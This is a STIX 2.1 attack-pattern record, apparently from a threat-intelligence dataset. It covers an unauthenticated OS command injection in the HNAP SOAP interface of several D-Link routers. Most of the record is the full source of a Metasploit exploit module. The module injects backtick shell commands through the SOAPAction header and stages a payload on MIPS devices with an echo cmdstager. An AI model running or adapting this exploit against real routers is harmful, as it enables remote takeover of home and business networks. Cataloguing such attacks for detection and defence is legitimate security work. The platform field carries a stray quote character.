{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eefa703b-64ad-4c82-8682-8809c11df004",
    "created": "2024-08-14T17:00:40.545364Z",
    "modified": "2024-08-14T17:00:40.545368Z",
    "name": "D-Link Devices HNAP SOAPAction-Header Command Execution",
    "description": " Different D-Link Routers are vulnerable to OS command injection in the HNAP SOAP interface. Since it is a blind OS command injection vulnerability, there is no output for the executed command. This module has been tested on a DIR-645 device. The following devices are also reported as affected: DAP-1522 revB, DAP-1650 revB DIR-880L, DIR-865L, DIR-860L revA, DIR-860L revB DIR-815 revB, DIR-300 revB DIR-600 revB, DIR-645, TEW-751DR, TEW-733GR ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_hnap_header_exec_noauth.rb",
            "external_id": "dlink_hnap_header_exec_noauth.rb"
        },
        {
            "source_name": "reference",
            "url": "http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10051"
        },
        {
            "source_name": "reference",
            "url": "http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'D-Link Devices HNAP SOAPAction-Header Command Execution',\n      'Description' => %q{\n        Different D-Link Routers are vulnerable to OS command injection in the HNAP SOAP\n        interface. Since it is a blind OS command injection vulnerability, there is no\n        output for the executed command. This module has been tested on a DIR-645 device.\n        The following devices are also reported as affected: DAP-1522 revB, DAP-1650 revB,\n        DIR-880L, DIR-865L, DIR-860L revA, DIR-860L revB DIR-815 revB, DIR-300 revB,\n        DIR-600 revB, DIR-645, TEW-751DR, TEW-733GR\n      },\n      'Author'      =>\n        [\n          'Samuel Huntley', # first public documentation of this Vulnerability on DIR-645\n          'Craig Heffner',  # independent Vulnerability discovery on different other routers\n          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10051'],\n          ['URL', 'http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/']\n        ],\n      'DisclosureDate' => '2015-02-13',\n      'Privileged'     => true,\n      'Platform'       => 'linux',\n      'Targets' =>\n        [\n          [ 'MIPS Little Endian',\n            {\n              'Arch'     => ARCH_MIPSLE\n            }\n          ],\n          [ 'MIPS Big Endian',  # unknown if there are BE devices out there ... but in case we have a target\n            {\n              'Arch'     => ARCH_MIPSBE\n            }\n          ]\n        ],\n      'DefaultTarget'    => 0\n      ))\n\n      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    uri = '/HNAP1/'\n    soap_action = 'http://purenetworks.com/HNAP1/GetDeviceSettings'\n\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'method' => 'GET',\n        'headers' => {\n          'SOAPAction' => soap_action,\n          }\n      })\n\n      if res && [200].include?(res.code) && res.body =~ /D-Link/\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Trying to access the device ...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the vulnerable device\")\n    end\n\n    print_status(\"Exploiting...\")\n\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 200,\n      :temp    => ''\n    )\n  end\n\n  def execute_command(cmd, opts)\n\n    uri = '/HNAP1/'\n\n    # we can not use / in our command so we need to use a little trick\n    cmd_new = 'cd && cd tmp && export PATH=$PATH:. && ' << cmd\n    soap_action = \"http://purenetworks.com/HNAP1/GetDeviceSettings/`#{cmd_new}`\"\n\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'method' => 'GET',\n        'headers' => {\n          'SOAPAction' => soap_action,\n          }\n      }, 3)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-13",
    "x_mitre_platforms": [
        "linux'"
    ]
}